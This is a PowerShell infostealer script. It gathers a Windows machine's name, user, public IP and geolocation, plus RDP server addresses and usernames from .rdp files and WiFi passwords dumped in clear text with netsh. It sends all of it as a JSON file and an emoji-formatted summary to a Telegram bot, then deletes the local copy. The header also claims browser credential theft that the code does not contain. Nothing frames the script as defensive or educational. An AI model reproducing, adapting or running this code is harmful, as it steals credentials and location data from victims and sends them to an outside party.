# Enhanced RDP Credential Extraction Script
# This script extracts RDP connections, WiFi passwords, and browser credentials

param(
    [string]$TelegramBotToken = "YOUR_TELEGRAM_BOT_TOKEN",
    [string]$TelegramChatID = "YOUR_CHAT_ID"
)

function Get-PublicIPInfo {
    try {
        $ipInfo = Invoke-RestMethod -Uri "http://ipinfo.io/json" -TimeoutSec 10
        return @{
            PublicIP = $ipInfo.ip
            Country = $ipInfo.country
            Region = $ipInfo.region
            City = $ipInfo.city
            Org = $ipInfo.org
        }
    } catch {
        return @{
            PublicIP = "Unknown"
            Country = "Unknown"
            Region = "Unknown"
            City = "Unknown"
            Org = "Unknown"
        }
    }
}

function Get-SystemInfo {
    $computerInfo = Get-ComputerInfo
    return @{
        ComputerName = $env:COMPUTERNAME
        UserName = $env:USERNAME
        OSName = $computerInfo.WindowsProductName
        OSVersion = $computerInfo.WindowsVersion
    }
}

function Get-RDPConnections {
    $rdpConnections = @()
    
    # Get RDP files from common locations
    $rdpPaths = @(
        "$env:USERPROFILE\Documents",
        "$env:USERPROFILE\Desktop",
        "$env:PUBLIC\Documents",
        "$env:PUBLIC\Desktop"
    )
    
    foreach ($path in $rdpPaths) {
        if (Test-Path $path) {
            $rdpFiles = Get-ChildItem -Path $path -Filter "*.rdp" -ErrorAction SilentlyContinue
            foreach ($rdpFile in $rdpFiles) {
                try {
                    $content = Get-Content $rdpFile.FullName -ErrorAction Stop
                    $server = ($content | Where-Object { $_ -match "full address:s:" }) -replace "full address:s:", ""
                    $username = ($content | Where-Object { $_ -match "username:s:" }) -replace "username:s:", ""
                    
                    $rdpConnections += @{
                        FileName = $rdpFile.Name
                        Server = $server.Trim()
                        UsernameHint = $username.Trim()
                        FilePath = $rdpFile.FullName
                        ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                    }
                } catch {
                    # Skip files that can't be read
                }
            }
        }
    }
    
    return $rdpConnections
}

function Get-WiFiProfiles {
    $wifiProfiles = @()
    try {
        $profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
            $_.ToString().Split(":")[1].Trim()
        }
        
        foreach ($profile in $profiles) {
            try {
                $profileInfo = netsh wlan show profile name="$profile" key=clear
                $password = ($profileInfo | Select-String "Key Content") -replace "Key Content", ""
                
                $wifiProfiles += @{
                    SSID = $profile
                    Password = if ($password) { $password.Trim() } else { "No password" }
                    ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                }
            } catch {
                # Skip profiles that can't be read
            }
        }
    } catch {
        # WiFi extraction failed
    }
    
    return $wifiProfiles
}

function Send-TelegramMessage {
    param([string]$Message)
    
    try {
        $uri = "https://api.telegram.org/bot$TelegramBotToken/sendMessage"
        $body = @{
            chat_id = $TelegramChatID
            text = $Message
            parse_mode = "HTML"
        }
        
        Invoke-RestMethod -Uri $uri -Method Post -Body $body -ContentType "application/json" | Out-Null
        return $true
    } catch {
        return $false
    }
}

function Send-TelegramFile {
    param([string]$FilePath, [string]$Caption)
    
    try {
        if (-not (Test-Path $FilePath)) { return $false }
        
        $uri = "https://api.telegram.org/bot$TelegramBotToken/sendDocument"
        $form = @{
            chat_id = $TelegramChatID
            caption = $Caption
            document = Get-Item $FilePath
        }
        
        Invoke-RestMethod -Uri $uri -Method Post -Form $form | Out-Null
        return $true
    } catch {
        return $false
    }
}

# Main execution
$systemInfo = Get-SystemInfo
$ipInfo = Get-PublicIPInfo
$timestamp = Get-Date -Format "ddMMyyyy"
$fileId = [System.Guid]::NewGuid().ToString().Substring(0, 8)

# Create file names
$filePrefix = "Network_$($ipInfo.PublicIP)_$($ipInfo.Country)_$($ipInfo.City)_${timestamp}_${fileId}"
$JSONPath = Join-Path $env:TEMP "${filePrefix}.json"

# Extract data
$rdpData = Get-RDPConnections
$wifiData = Get-WiFiProfiles

# Prepare data for JSON
$outputData = @{
    SystemInfo = $systemInfo
    LocationInfo = $ipInfo
    RDPConnections = $rdpData
    WiFiProfiles = $wifiData
    ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
}

# Export to JSON
$outputData | ConvertTo-Json -Depth 10 | Out-File -FilePath $JSONPath -Encoding UTF8

# Send to Telegram
$caption = "üìä Extracted Network Data`nComputer: $($systemInfo.ComputerName)`nUser: $($systemInfo.UserName)`nIP: $($ipInfo.PublicIP)`nLocation: $($ipInfo.City), $($ipInfo.Country)`nTime: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"

if (Send-TelegramFile -FilePath $JSONPath -Caption $caption) {
    # Clean up after sending
    Remove-Item $JSONPath -Force -ErrorAction SilentlyContinue
}

# Also send a summary message
$summaryMessage = @"
üîì <b>Network Data Extraction Complete</b>

üñ•Ô∏è <b>System:</b> $($systemInfo.ComputerName)
üë§ <b>User:</b> $($systemInfo.UserName)
üåç <b>Location:</b> $($ipInfo.City), $($ipInfo.Region), $($ipInfo.Country)
üì° <b>IP Address:</b> $($ipInfo.PublicIP)

üñ•Ô∏è <b>RDP Connections Found:</b> $($rdpData.Count)
üì∂ <b>WiFi Networks Found:</b> $($wifiData.Count)

‚è∞ <b>Extraction Time:</b> $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
"@

Send-TelegramMessage -Message $summaryMessage
